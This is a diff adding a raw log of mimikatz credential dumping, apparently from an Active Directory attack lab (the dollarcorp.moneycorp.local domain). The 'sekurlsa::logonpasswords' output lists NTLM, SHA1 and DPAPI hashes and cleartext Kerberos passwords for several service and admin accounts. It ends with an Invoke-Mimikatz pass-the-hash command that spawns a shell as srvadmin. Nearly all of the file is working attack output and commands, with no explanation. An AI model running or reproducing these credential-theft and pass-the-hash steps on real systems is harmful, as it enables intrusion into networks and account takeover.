@@ -1,0 +1,176 @@
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.co
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.c
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 448687 (00000000:0006d8af)
+Session           : RemoteInteractive from 2
+User Name         : srvadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/18/2020 12:04:55 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1115
+        msv :
+         [00000003] Primary
+         * Username : srvadmin
+         * Domain   : dcorp
+         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
+         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
+         * DPAPI    : ddce77eab64944efda38b5cfdad5395f
+        tspkg :
+        wdigest :
+         * Username : srvadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : srvadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 65602 (00000000:00010042)
+Session           : Service from 0
+User Name         : appadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/17/2020 11:54:15 PM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1117
+        msv :
+         [00000003] Primary
+         * Username : appadmin
+         * Domain   : dcorp
+         * NTLM     : d549831a955fee51a43c83efb3928fa7
+         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
+         * DPAPI    : 7ec84538f109f73066103b9d1629f95e
+        tspkg :
+        wdigest :
+         * Username : appadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : appadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : *ActuallyTheWebServer1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 65255 (00000000:0000fee7)
+Session           : Service from 0
+User Name         : websvc
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/17/2020 11:54:15 PM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1113
+        msv :
+         [00000003] Primary
+         * Username : websvc
+         * Domain   : dcorp
+         * NTLM     : cc098f204c5887eaa8253e7c2749156f
+         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
+         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c
+        tspkg :
+        wdigest :
+         * Username : websvc
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : websvc
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : AServicewhichIsNotM3@nttoBe
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DCORP-ADMINSRV$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 1/17/2020 11:54:12 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : DCORP-ADMINSRV$
+         * Domain   : dcorp
+         * NTLM     : a8fcdf3c7b2d30807850f77866813c67
+         * SHA1     : bc3b724cec7a29e8f2022219e42b2d733b1075c4
+        tspkg :
+        wdigest :
+         * Username : DCORP-ADMINSRV$
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : dcorp-adminsrv$
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/17/2020 11:54:13 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 21341 (00000000:0000535d)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 1/17/2020 11:54:12 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : DCORP-ADMINSRV$
+         * Domain   : dcorp
+         * NTLM     : a8fcdf3c7b2d30807850f77866813c67
+         * SHA1     : bc3b724cec7a29e8f2022219e42b2d733b1075c4
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DCORP-ADMINSRV$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 1/17/2020 11:54:12 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DCORP-ADMINSRV$
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : dcorp-adminsrv$
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(powershell) # exit
+
+
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
